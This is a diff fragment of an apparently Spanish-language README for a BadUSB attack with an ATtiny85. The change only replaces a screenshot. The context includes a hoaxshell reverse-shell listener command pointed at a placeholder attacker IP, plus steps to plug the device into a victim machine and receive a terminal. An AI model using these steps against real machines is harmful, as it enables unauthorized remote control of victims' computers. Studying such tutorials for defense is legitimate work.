@@ -63,7 +63,8 @@ python3 ./hoaxshell.py -s IP_ATACANTE -r -H 'Authorization'
 
 
 ### 5. Compilar el script y conectar el ATTINY 85. Una vez hecho esto, el USB estara listo para el ataque.
-<img width="2531" height="1378" alt="imagen" src="https://github.com/user-attachments/assets/6d478ecd-7554-4342-a291-28438e7848d8" />
+<img width="865" height="966" alt="imagen" src="https://github.com/user-attachments/assets/e729488c-4b31-4471-975f-26178ed15a8d" />
+
 
 
 ### 6. Conectar el dispositivo a la máquina victima y esperar la Respuesta. Si todo sale bien recibiremos la terminal.
